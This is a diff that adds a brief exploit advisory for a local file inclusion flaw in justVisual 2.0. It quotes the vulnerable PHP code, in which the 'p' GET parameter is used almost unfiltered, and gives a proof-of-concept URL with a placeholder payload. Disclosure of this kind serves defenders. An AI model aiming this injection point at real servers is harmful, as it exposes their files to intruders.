@@ -1,0 +1,32 @@
+#########################################################################
+	justVisual 2.0 (index.php) <= LFI Vulnerability
+#########################################################################
+
+[+]Title:	justVisual 2.0 (index.php) Local File Vulnerability
+[+]Version:	2.0
+[+]License:	http://www.gnu.org/copyleft/gpl.html
+[+]Download:	http://fh54.de/justVisual/packages/justVisual2.zip
+[+]Risk:	Medium
+[+]Local:	Yes
+[-]Remote:	No
+
+###########################################################
+[!]Author:  eidelweiss
+[!]Contact: eidelweiss[at]cyberservices[dot]com
+[!]Thank`s: sp3x (securityreason) - JosS (hack0wn) - r0073r & 0x1D (inj3ct0r)
+[!]Special: [D]eal [C]yber - syabilla_putri (miss u) & all my friends
+###########################################################
+
+-=[ VULN CODE ]=-
+
+	$selfname=basename($_SERVER['PHP_SELF'],'.php'); 
+	if(isset($_GET['p']) && !empty($_GET['p'])) {
+		//$selfname=basename($_GET['p'],'.php');
+		$selfname=str_replace('.php','',$_GET['p']);
+
+
+-=[ P0C ]=-
+
+	Http://127.0.0.1/index.php?p=[LFI]
+
+###############################=[E0F]=###################################
